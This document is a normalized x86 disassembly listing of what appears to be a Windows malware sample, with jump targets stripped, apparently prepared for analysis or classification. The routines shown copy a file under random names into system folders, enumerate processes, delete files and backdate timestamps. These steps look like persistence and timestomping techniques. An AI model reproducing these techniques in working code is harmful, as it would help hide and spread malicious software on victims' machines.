mov al 0x1
jmp r-xdata
push r--data
lea eax [ ebp - 0x620 ]
push eax
call edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push r--data
lea eax [ ebp - 0x418 ]
push eax
call ebx
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x418 ]
push eax
call edi
push r--data
lea eax [ ebp - 0x418 ]
push eax
call edi
call sub_40107d
push eax
lea eax [ ebp - 0x418 ]
push eax
call edi
lea eax [ ebp - 0x418 ]
push eax
lea eax [ ebp - 0x620 ]
push eax
lea esi [ ebp - 0x4 ]
call sub_401e94
test al al
je r-xdata
sub_402298
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x18 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ SystemTimeToFileTime@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
push 0x0
push 0x989680
push ecx
push eax
call sub_411310
leave
retn
sub_4022cc
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x10 ]
push eax
call [ GetSystemTime@IAT ]
call [ GetTickCount@IAT ]
movzx ecx [ ebp - 0x2 ]
shl eax 0x10
xor eax ecx
xor eax [ rw-data ]
xor edx edx
imul eax eax 0x19660d
add eax 0x3c6ef35f
div [ ebp + 0x8 ]
mov eax edx
mov [ rw-data ] eax
leave
retn 0x4
sub_40230c
push edi
push 0x20
call sub_4022cc
xor edi edi
test esi esi
jne r-xdata
mov ax [ eax * 2 + rw-data ]
push ebx
push 0x6
mov [ esi ] ax
pop ebx
xor al al
pop edi
retn
push 0x20
call sub_4022cc
mov ax [ eax * 2 + rw-data ]
inc edi
dec ebx
mov [ esi + edi * 2 ] ax
jne r-xdata
and [ esi + edi * 2 ] bx
pop ebx
mov al 0x1
pop edi
retn
sub_40234d
push ebp
mov ebp [ esp + 0x8 ]
push esi
push 0x16
call sub_4022cc
test ebp ebp
mov esi eax
jne r-xdata
imul eax eax 0xc
push ebx
push edi
mov edi rw-data
add eax edi
push eax
push ebp
call [ lstrcpyW@IAT ]
mov ebx esi
mov [ esp + 0x14 ] 0x2
xor al al
jmp r-xdata
mov eax esi
imul eax eax 0xc
add eax edi
push eax
push ebp
call [ lstrcatW@IAT ]
dec [ esp + 0x14 ]
mov ebx esi
jne r-xdata
inc esi
cmp esi 0x16
jl r-xdata
pop esi
pop ebp
retn 0x4
push 0x16
call sub_4022cc
mov esi eax
cmp esi ebx
jne r-xdata
pop edi
mov al 0x1
pop ebx
xor esi esi
sub_4023b7
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
push [ ebp + 0x8 ]
call esi
push [ ebp + 0xc ]
mov edi eax
mov [ ebp - 0x10 ] edi
call esi
mov ebx eax
lea eax [ ebx + 0x1 ]
lea ecx [ edi + 0x1 ]
imul eax ecx
test eax eax
mov [ ebp - 0x14 ] ebx
jl r-xdata
xor edx edx
mov [ ebp - 0xc ] edx
call sub_4038dd
mov edx eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax ebx
imul eax edi
test eax eax
mov ecx edx
je r-xdata
xor al al
jmp r-xdata
test edx edx
jne r-xdata
and [ ebp - 0x4 ] 0x0
test edi edi
jle r-xdata
mov [ ecx ] 0x0
inc ecx
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
xor ecx ecx
test edi edi
mov [ ebp + 0xf ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edi edx
sub edi ebx
mov [ ebp - 0x8 ] edx
mov [ ebp + 0x8 ] eax
dec edi
push edx
call sub_40391f
mov al [ ebp + 0xf ]
lea eax [ edx + ebx - 0x1 ]
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add [ ebp + 0x8 ] 0x2
add [ ebp - 0x8 ] ebx
add edi ebx
cmp eax [ ebp - 0x10 ]
jl r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + esi * 2 ]
push eax
call sub_40b1a4
mov ebx eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
call sub_40b1a4
cmp eax ebx
pop ecx
pop ecx
je r-xdata
mov [ ebp + 0xf ] 0x1
inc ecx
add eax ebx
cmp ecx edi
jl r-xdata
xor esi esi
test ebx ebx
jle r-xdata
mov edi [ ebp - 0x10 ]
cmp [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
movzx eax [ eax + esi * 2 ]
cmp ax 0x3f
je r-xdata
movzx esi [ eax ]
cmp esi ebx
je r-xdata
jmp r-xdata
xor eax eax
inc eax
test esi esi
jle r-xdata
cmp ax 0x2a
jne r-xdata
mov edx [ ebp - 0xc ]
movzx eax [ edi + esi ]
inc eax
jmp r-xdata
mov ebx [ ebp - 0x14 ]
inc esi
cmp esi ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
test edx edx
jle r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx + esi ] al
xor eax eax
inc eax
test esi esi
jle r-xdata
xor ecx ecx
inc ecx
movzx ecx [ edi + esi + 0x1 ]
jmp r-xdata
movzx eax [ edi + esi ]
inc eax
jmp r-xdata
test edx edx
jle r-xdata
test edx edx
jmp r-xdata
cmp eax ecx
jle r-xdata
test edx edx
jle r-xdata
movzx eax [ edi + esi + 0x1 ]
jmp r-xdata
jle r-xdata
sub_402519
test ebx ebx
jne r-xdata
push esi
push edi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax + 0x2 ]
test esi esi
jl r-xdata
xor eax eax
retn
xor edi edi
mov eax esi
call sub_4038dd
mov edi eax
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
push esi
push ebx
push edi
call sub_40b1d0
add esp 0xc
test edi edi
je r-xdata
sub_402552
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
test ebx ebx
push edi
je r-xdata
xor al al
mov eax [ esi + 0x728 ]
test eax eax
jl r-xdata
cmp eax 0x20
jge r-xdata
xor ecx ecx
test eax eax
jle r-xdata
imul eax eax 0x11
push 0x11
lea eax [ eax + esi + 0x508 ]
push ebx
push eax
call sub_40ab70
add esp 0xc
mov edi [ ebx + 0x8 ]
lea edx [ esi + 0x510 ]
fild [ esp + 0x4 ]
fdivr [ r--data ]
fldz
fld st0
fucomp st2
fnstsw ax
test ah 0x44
jpe r-xdata
lea eax [ esi + 0x510 ]
mov edi ecx
push 0x1f
pop edx
mov eax ecx
imul eax eax 0x11
sub edx ecx
imul edx edx 0x11
add eax esi
lea edi [ eax + 0x508 ]
push edx
add eax 0x519
push edi
push eax
call sub_40ab70
push 0x11
push ebx
push edi
call sub_40ab70
add esp 0x18
jmp r-xdata
inc ecx
add edx 0x11
cmp ecx eax
jl r-xdata
xor edi edi
xor edx edx
test ecx ecx
jle r-xdata
fstp st1
fld1
fxch st1
add edx [ eax ]
add eax 0x11
dec edi
jne r-xdata
mov [ esp + 0x4 ] edx
inc [ esi + 0x728 ]
mov ecx [ esi + 0x728 ]
xor edx edx
test ecx ecx
mov [ esp + 0x4 ] edx
jle r-xdata
cmp edi [ edx ]
jge r-xdata
fstp st0
mov al 0x1
fstp st0
jmp r-xdata
lea ecx [ esi + 0x510 ]
pop edi
mov esp ebp
pop ebp
retn
fnstsw ax
test ah 0x41
je r-xdata
mov [ esi + edi + 0x72c ] dl
inc edi
cmp edi 0x64
jge r-xdata
cmp edi 0x64
jge r-xdata
inc [ esp + 0x4 ]
fild [ esp + 0x4 ]
fild [ ecx ]
fmul st3
fcompp
inc edx
add ecx 0x11
cmp edx [ esi + 0x728 ]
jl r-xdata
fild [ ecx ]
and [ esp + 0x4 ] 0x0
fmul st2
fcomp st1
jmp r-xdata
sub_402685
push ebx
xor eax eax
mov ebx rw-data
cmp eax ebx
je r-xdata
xor al al
pop ebx
retn
mov eax [ esi + 0x504 ]
test eax eax
jl r-xdata
cmp eax 0x20
jge r-xdata
xor ecx ecx
test eax eax
push edi
jle r-xdata
imul eax eax 0x14
push 0x14
lea eax [ eax + esi + 0x284 ]
push ebx
push eax
call sub_40ab70
add esp 0xc
lea edx [ esi + 0x28c ]
push 0x1f
pop edx
mov eax ecx
imul eax eax 0x14
sub edx ecx
imul edx edx 0x14
add eax esi
lea edi [ eax + 0x284 ]
push edx
add eax 0x298
push edi
push eax
call sub_40ab70
push 0x14
push ebx
push edi
call sub_40ab70
add esp 0x18
jmp r-xdata
inc ecx
add edx 0x14
cmp ecx eax
jl r-xdata
inc [ esi + 0x504 ]
pop edi
mov al 0x1
pop ebx
retn
mov edi [ rw-data ]
cmp edi [ edx ]
jg r-xdata
sub_402714
push ebp
xor eax eax
mov ebp rw-data
cmp eax ebp
je r-xdata
xor al al
pop ebp
retn
mov eax [ esi + 0x2494 ]
test eax eax
jl r-xdata
cmp eax 0x20
jge r-xdata
push ebx
xor ecx ecx
test eax eax
push edi
mov edi 0xe4
jle r-xdata
imul eax eax 0xe4
push edi
lea eax [ eax + esi + 0x814 ]
push ebp
push eax
call sub_40ab70
add esp 0xc
lea edx [ esi + 0x81c ]
push 0x1f
pop edx
mov eax ecx
imul eax eax 0xe4
sub edx ecx
imul edx edx 0xe4
add eax esi
lea ebx [ eax + 0x814 ]
push edx
add eax 0x8f8
push ebx
push eax
call sub_40ab70
push edi
push ebp
push ebx
call sub_40ab70
add esp 0x18
jmp r-xdata
inc ecx
add edx edi
cmp ecx eax
jl r-xdata
inc [ esi + 0x2494 ]
pop edi
pop ebx
mov al 0x1
pop ebp
retn
mov ebx [ rw-data ]
cmp ebx [ edx ]
jg r-xdata
sub_4027b8
mov eax sub_415b9b
call sub_411740
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_401b2c
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ eax ]
pop ecx
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_402804
push ecx
push ebp
xor ebp ebp
cmp [ ebx + 0x4118 ] ebp
jle r-xdata
mov al 0x1
pop ebp
pop ecx
retn
push esi
push edi
mov esi rw-data
lea edi [ ebx + 0x2578 ]
push 0xc8
call [ Sleep@IAT ]
inc ebp
add edi 0xe4
add esi 0xc
cmp ebp [ ebx + 0x4118 ]
jl r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax [ edi - 0xe0 ]
mov [ esi ] eax
lea eax [ esp + 0xc ]
push eax
push 0x0
push esi
push sub_4027b8
push 0x10000
push 0x0
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] edi
call [ CreateThread@IAT ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
sub_402875
mov eax sub_415b91
call sub_411740
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_401b2c
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
mov ecx [ ecx + 0x4 ]
imul ecx ecx 0xe4
push eax
call [ ecx + eax + 0x814 ]
pop ecx
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4028cd
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
cmp [ esi + 0x2494 ] ebx
jle r-xdata
mov al 0x1
pop ebx
leave
retn
push edi
lea edi [ esi + 0x8f4 ]
push 0xc8
call [ Sleep@IAT ]
inc ebx
add edi 0xe4
cmp ebx [ esi + 0x2494 ]
jl r-xdata
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov eax [ ebp - 0xc ]
push [ ebp - 0x4 ]
add [ edi ] eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push sub_402875
push 0x10000
push 0x0
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] ebx
call [ CreateThread@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
sub_402946
mov eax sub_415b87
call sub_411740
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_401b2c
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
mov ecx [ ecx + 0x4 ]
imul ecx ecx 0x11
push eax
call [ ecx + eax + 0x508 ]
pop ecx
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_40299b
push ebp
mov ebp esp
mov eax [ esi + 0x728 ]
sub esp 0x14
test eax eax
jg r-xdata
push edi
xor edi edi
test eax eax
jle r-xdata
xor al al
leave
retn
mov al 0x1
pop edi
leave
retn
push ebx
lea ebx [ esi + 0x515 ]
push 0xc8
call [ Sleep@IAT ]
inc edi
add ebx 0x11
cmp edi [ esi + 0x728 ]
jl r-xdata
cmp [ ebx - 0x1 ] 0x0
jne r-xdata
xor eax eax
lea ecx [ ebp - 0x8 ]
push ecx
push eax
lea ecx [ ebp - 0x14 ]
push ecx
push sub_402946
push 0x10000
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] eax
call [ CreateThread@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
pop ebx
mov eax [ ebp - 0xc ]
push [ ebp - 0x4 ]
add [ ebx ] eax
call [ CloseHandle@IAT ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
sub_402a24
mov eax sub_415bb3
call sub_411740
test [ rw-data ] 0x1
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax rw-data
mov [ fs : 0x0 ] ecx
leave
retn
or [ rw-data ] 0x1
and [ ebp - 0x4 ] 0x0
call sub_401d53
push sub_415f1f
call sub_40aff9
pop ecx
or [ ebp - 0x4 ] 0xffffffff
sub_402a67
push ebp
mov ebp esp
sub esp 0x22c
push esi
push 0x0
push 0x2
mov [ ebp - 0x22c ] 0x22c
call CreateToolhelp32Snapshot
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x22c ]
push eax
push esi
call Process32FirstW
test eax eax
je r-xdata
xor al al
jmp r-xdata
push esi
call [ CloseHandle@IAT ]
mov al 0x1
push [ ebp + 0xc ]
lea eax [ ebp - 0x22c ]
push eax
call [ ebp + 0x8 ]
cmp al 0x1
pop ecx
pop ecx
jne r-xdata
pop esi
leave
retn 0x8
jmp r-xdata
lea eax [ ebp - 0x22c ]
push eax
push esi
call Process32NextW
test eax eax
jne r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x22c ]
push eax
call [ ebp + 0x8 ]
test al al
pop ecx
pop ecx
je r-xdata
sub_402ae7
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
xor edi edi
sub eax edi
je r-xdata
mov eax 0x80000000
push 0x3
jmp r-xdata
dec eax
je r-xdata
pop ecx
jmp r-xdata
mov eax 0xc0000000
push 0x4
dec eax
je r-xdata
push edi
push 0x80
push ecx
push edi
push 0x1
push eax
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax 0x40000000
push 0x2
jmp r-xdata
dec eax
jne r-xdata
cmp [ ebp + 0xc ] 0x3
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0xc ]
mov eax esi
push 0x2
push edi
push edi
push esi
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
sub_402b5d
push ebp
mov ebp esp
push ecx
xor eax eax
cmp [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
je r-xdata
leave
retn 0xc
push eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ WriteFile@IAT ]
neg eax
sbb eax eax
and eax [ ebp - 0x4 ]
sub_402b8a
push ebp
mov ebp esp
sub esp 0x288
test ebx ebx
jne r-xdata
push edi
push 0x20
push ebx
call [ SetFileAttributesW@IAT ]
mov edi [ DeleteFileW@IAT ]
push ebx
call edi
test eax eax
jne r-xdata
xor al al
leave
retn
setne al
pop edi
leave
retn
push esi
push 0x104
push ebx
lea eax [ ebp - 0x288 ]
push eax
call [ lstrcpynW@IAT ]
and [ ebp - 0x80 ] 0x0
lea esi [ ebp - 0x80 ]
call sub_40230c
mov eax esi
push eax
lea eax [ ebp - 0x288 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x288 ]
push eax
push ebx
call [ MoveFileW@IAT ]
test eax eax
pop esi
jne r-xdata
lea eax [ ebp - 0x288 ]
push eax
call edi
test eax eax
push ebx
call edi
sub_402c0a
push ebp
mov ebp esp
sub esp 0x468
push ebx
push esi
push edi
mov ebx edx
push ebx
mov [ ebp - 0x8 ] ecx
call [ lstrlenW@IAT ]
test ebx ebx
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x14
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edi [ lstrcpyW@IAT ]
push ebx
lea eax [ ebp - 0x214 ]
push eax
call edi
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x214 ]
push eax
call esi
lea eax [ ebp - 0x464 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0xc ] eax
je r-xdata
test [ ebp - 0x464 ] 0x10
jne r-xdata
push r--data
lea eax [ ebp - 0x438 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x464 ]
push eax
push [ ebp - 0xc ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ ebp - 0x438 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
push 0x1
call [ Sleep@IAT ]
push [ ebp + 0x18 ]
lea eax [ ebp - 0x464 ]
push eax
push ebx
push [ ebp - 0x8 ]
call [ ebp + 0x14 ]
add esp 0x10
test al al
je r-xdata
push [ ebp - 0xc ]
call [ FindClose@IAT ]
mov al 0x1
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x464 ]
push eax
push ebx
push [ ebp - 0x8 ]
call [ ebp + 0x14 ]
add esp 0x10
test al al
je r-xdata
push ebx
lea eax [ ebp - 0x214 ]
push eax
call edi
push r--data
lea eax [ ebp - 0x214 ]
push eax
call esi
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
call esi
push [ ebp + 0x18 ]
dec [ ebp + 0x8 ]
push [ ebp + 0x14 ]
mov ecx [ ebp - 0x8 ]
push [ ebp + 0x10 ]
lea edx [ ebp - 0x214 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_402c0a
sub_402d87
push ebp
mov ebp esp
sub esp 0x208
and [ ebp - 0x208 ] 0x0
push 0x206
lea eax [ ebp - 0x206 ]
push 0x0
push eax
call sub_40e940
add esp 0xc
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push ebx
push esi
mov esi 0x104
push esi
lea eax [ ebp - 0x208 ]
push eax
call [ GetWindowsDirectoryW@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push r--data
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcpyW@IAT ]
cmp eax esi
jb r-xdata
leave
retn 0x4
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x208 ]
push eax
call esi
lea ebx [ ebp - 0x208 ]
call sub_402519
pop esi
pop ebx
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
lea eax [ ebp - 0x208 ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x20a ] 0x5c
mov esi [ lstrcatW@IAT ]
je r-xdata
sub_402e41
push ebp
mov ebp esp
sub esp 0x208
push esi
xor esi esi
push 0x206
lea eax [ ebp - 0x206 ]
push esi
push eax
mov [ ebp - 0x208 ] si
call sub_40e940
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
lea eax [ ebp - 0x208 ]
push eax
push esi
push esi
push 0x1c
push esi
call [ SHGetFolderPathW@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x208 ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x20a ] 0x5c
mov esi [ lstrcatW@IAT ]
je r-xdata
push r--data
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcpyW@IAT ]
pop esi
leave
retn 0x4
push ebx
push [ ebp + 0x8 ]
lea eax [ ebp - 0x208 ]
push eax
call esi
lea ebx [ ebp - 0x208 ]
call sub_402519
pop ebx
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
sub_402ee4
push ebp
mov ebp esp
sub esp 0x208
and [ ebp - 0x208 ] 0x0
push ebx
push edi
push 0x206
lea eax [ ebp - 0x206 ]
push 0x0
push eax
call sub_40e940
add esp 0xc
call sub_40107d
push eax
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x208 ]
push eax
call [ lstrlenW@IAT ]
mov edi [ lstrcatW@IAT ]
lea ecx [ ebp + eax * 2 - 0x20a ]
jmp r-xdata
cmp [ ecx ] 0x5c
jne r-xdata
dec eax
dec ecx
dec ecx
cmp eax 0x1
jbe r-xdata
cmp eax 0x1
jbe r-xdata
and [ ebp - 0x208 ] 0x0
cmp [ ebp + eax * 2 - 0x20a ] 0x5c
je r-xdata
push r--data
lea eax [ ebp - 0x208 ]
push eax
call edi
lea ebx [ ebp - 0x208 ]
call sub_402519
pop edi
pop ebx
leave
retn
push r--data
lea eax [ ebp - 0x208 ]
push eax
call edi
jmp r-xdata
sub_402f8f
push ebp
mov ebp esp
sub esp 0x208
and [ ebp - 0x208 ] 0x0
push 0x206
lea eax [ ebp - 0x206 ]
push 0x0
push eax
call sub_40e940
add esp 0xc
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push ebx
push esi
push 0x0
mov esi 0x104
push esi
lea eax [ ebp - 0x208 ]
push eax
call sub_40109e
movzx eax al
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push r--data
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcpyW@IAT ]
cmp eax esi
jb r-xdata
leave
retn 0x4
push [ ebp + 0x8 ]
lea eax [ ebp - 0x208 ]
push eax
call esi
lea ebx [ ebp - 0x208 ]
call sub_402519
pop esi
pop ebx
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
lea eax [ ebp - 0x208 ]
push eax
call [ lstrlenW@IAT ]
cmp [ ebp + eax * 2 - 0x20a ] 0x5c
mov esi [ lstrcatW@IAT ]
je r-xdata
sub_40303c
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_415bc8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x220
push ebx
push esi
push edi
lea esi [ esp + 0x10 ]
mov ebx ecx
call sub_401311
and [ esp + 0x234 ] 0x0
push 0x1
push 0x104
lea eax [ esp + 0x28 ]
push eax
call sub_40109e
test al al
je r-xdata
mov edi [ esp + 0x10 ]
mov eax ebx
imul eax eax 0x3
push 0x1
push eax
call sub_4039b5
mov edi [ esp + 0x10 ]
test edi edi
mov eax [ esp + 0x14 ]
mov [ esp + 0xc ] eax
je r-xdata
xor al al
call sub_402a24
push edi
call sub_40391f
xor al al
push ebx
push [ ebp + 0xc ]
lea eax [ esp + 0x14 ]
push edi
call sub_401143
jmp r-xdata
lea eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov eax ebx
imul eax eax 0x14
push 0x1
push eax
lea esi [ esp + 0x18 ]
call sub_4039b5
mov edi [ esp + 0x10 ]
test edi edi
mov eax [ esp + 0x14 ]
mov [ esp + 0xc ] eax
je r-xdata
test al al
jne r-xdata
or [ esp + 0x234 ] 0xffffffff
test edi edi
je r-xdata
push 0x1
push eax
call sub_402ae7
mov esi eax
test esi esi
je r-xdata
xor al al
push ebx
push [ ebp + 0xc ]
lea eax [ esp + 0x14 ]
push edi
call sub_401143
jmp r-xdata
test edi edi
mov ebx [ esp + 0xc ]
je r-xdata
test al al
je r-xdata
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
push ebx
push edi
push esi
call sub_402b5d
test eax eax
je r-xdata
cmp ebx [ esp + 0xc ]
jne r-xdata
push esi
mov esi [ CloseHandle@IAT ]
call esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push ebx
lea eax [ esp + 0x24 ]
push eax
call [ MoveFileW@IAT ]
test eax eax
je r-xdata
push 0x0
push ebx
call sub_402ae7
test eax eax
je r-xdata
or [ esp + 0x234 ] 0xffffffff
call sub_402a24
push edi
call sub_40391f
mov al 0x1
jmp r-xdata
push eax
call esi
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ esp + 0x22c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_402b8a
sub_4031bc
push ebp
mov ebp esp
sub esp 0xa4
push ebx
push esi
push edi
mov edi eax
test edi edi
mov ebx ecx
mov [ ebp - 0x1 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
test ebx ebx
jne r-xdata
call sub_402519
mov ebx eax
test ebx ebx
je r-xdata
lea eax [ ebp - 0xa0 ]
push eax
call sub_40234d
push [ ebp + 0x8 ]
lea eax [ ebp - 0xa0 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_402d87
mov esi [ CopyFileW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_402b8a
push 0x0
push ebx
push edi
call [ CopyFileW@IAT ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_402e41
mov ebx eax
test ebx ebx
je r-xdata
call sub_402b8a
push 0x0
push ebx
push edi
call esi
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
push ebx
call sub_40391f
xor ebx ebx
lea eax [ ebp - 0xa0 ]
push eax
call sub_402f8f
mov ebx eax
test ebx ebx
je r-xdata
call sub_402b8a
push 0x0
push ebx
push edi
call esi
test eax eax
jne r-xdata
test ebx ebx
jne r-xdata
push ebx
call sub_40391f
xor ebx ebx
push 0x1d608e
call sub_4022cc
and [ ebp - 0x1c ] 0x0
mov esi eax
add esi 0x9cada
test ebx ebx
je r-xdata
call sub_402b8a
push 0x0
push ebx
push edi
call esi
jmp r-xdata
test ebx ebx
jne r-xdata
push ebx
call sub_40391f
xor ebx ebx
push ebx
call sub_40391f
xor ebx ebx
push 0x1
push ebx
call sub_402ae7
mov edi eax
test edi edi
je r-xdata
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
call [ GetSystemTime@IAT ]
push 0x5
call sub_4022cc
xor ecx ecx
inc ecx
sub ecx eax
add [ ebp - 0x14 ] cx
push 0x6
call sub_4022cc
movzx ecx [ ebp - 0x12 ]
dec eax
sub ecx eax
jns r-xdata
push 0x0
push 0x0
push esi
push edi
call [ SetFilePointer@IAT ]
and [ ebp + 0xc ] 0x0
lea eax [ ebp - 0x1 ]
test eax eax
je r-xdata
sub [ ebp - 0x12 ] ax
push 0xc
pop ecx
sub ecx eax
add [ ebp - 0x12 ] cx
jmp r-xdata
push 0x0
lea eax [ ebp + 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push edi
call [ WriteFile@IAT ]
sub [ ebp - 0xe ] ax
push 0x1e
pop ecx
sub ecx eax
add [ ebp - 0xe ] cx
jmp r-xdata
push 0xf
call sub_4022cc
movzx ecx [ ebp - 0xe ]
dec eax
sub ecx eax
jns r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call [ SystemTimeToFileTime@IAT ]
lea eax [ ebp - 0x20 ]
push eax
push eax
push eax
push edi
call [ SetFileTime@IAT ]
push edi
call [ CloseHandle@IAT ]
jmp r-xdata
sub_4033a2
push ebp
mov ebp esp
sub esp 0x32c
push ebx
push esi
push edi
add eax 0x49e4
xor edi edi
cmp eax edi
mov [ ebp - 0x20 ] 0x80
mov [ ebp - 0x14 ] eax
je r-xdata
xor al al
push eax
call sub_403975
jmp r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
or eax [ rw-data ]
jne r-xdata
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov esi 0x100
mov ecx esi
lea eax [ ebp - 0x120 ]
push [ ebp - 0x14 ]
call sub_403995
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
push 0x104
lea eax [ ebp - 0x328 ]
push eax
call [ GetWindowsDirectoryW@IAT ]
push edi
push edi
push edi
push edi
lea eax [ ebp - 0x18 ]
push eax
push edi
push edi
lea eax [ ebp - 0x328 ]
push eax
